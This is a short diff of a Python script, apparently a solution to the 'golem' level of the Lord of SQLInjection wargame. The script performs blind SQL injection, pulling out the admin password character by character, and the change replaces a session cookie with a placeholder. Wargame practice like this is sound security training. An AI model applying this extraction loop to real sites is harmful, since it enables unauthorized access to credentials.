@@ -9,7 +9,7 @@ for i in range(1,9):
   for j in range(48,128): # ascii code로 변환할 chr() 함수로 전달할 파라미터 값
     try:
       url="https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=1' || id like 'admin' %26%26 right(left(pw, " + str(i) + "), 1) like'" + chr(j)
-      result = requests.post(url, cookies=(dict(PHPSESSID="hkl25jo4rhi9m0kgm27jn5ts0d")))
+      result = requests.post(url, cookies=(dict(PHPSESSID="세션값")))
     except:
       print("Error...")
       continue
